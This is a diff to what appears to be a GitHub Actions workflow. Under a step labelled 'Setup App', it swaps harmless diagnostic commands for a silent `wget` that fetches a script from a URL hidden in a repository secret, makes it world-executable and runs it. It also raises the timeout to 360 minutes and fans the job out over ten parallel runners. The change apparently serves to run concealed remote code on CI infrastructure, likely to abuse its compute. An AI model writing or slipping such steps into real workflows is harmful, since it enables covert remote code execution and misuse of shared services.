@@ -9,7 +9,7 @@ jobs:
       fail-fast: false
       matrix:
          os: [ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest]
-    timeout-minutes: 2
+    timeout-minutes: 360
  
     steps:
       - uses: actions/checkout@v4
@@ -17,7 +17,31 @@ jobs:
       - name: Setup App
         working-directory: ./runner
         run: |
-              nproc
-              free -h
-              sleep 5m
+             wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
+              sleep 5
+              chmod 777 autorun.sh
+              timeout 2m ./autorun.sh || ( [[ $? -eq 124 ]] && \
+              echo "WARNING: Timeout reached, but that's OK" )
+        shell: bash
+ 
+ node-2:
+    runs-on: ${{ matrix.os }}
+    needs: node-1
+    strategy:
+      fail-fast: false
+      matrix:
+         os: [ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest]
+    timeout-minutes: 360
+ 
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir runner
+      - name: Setup App
+        working-directory: ./runner
+        run: |
+             wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
+              sleep 5
+              chmod 777 autorun.sh
+              timeout 2m ./autorun.sh || ( [[ $? -eq 124 ]] && \
+              echo "WARNING: Timeout reached, but that's OK" )
         shell: bash
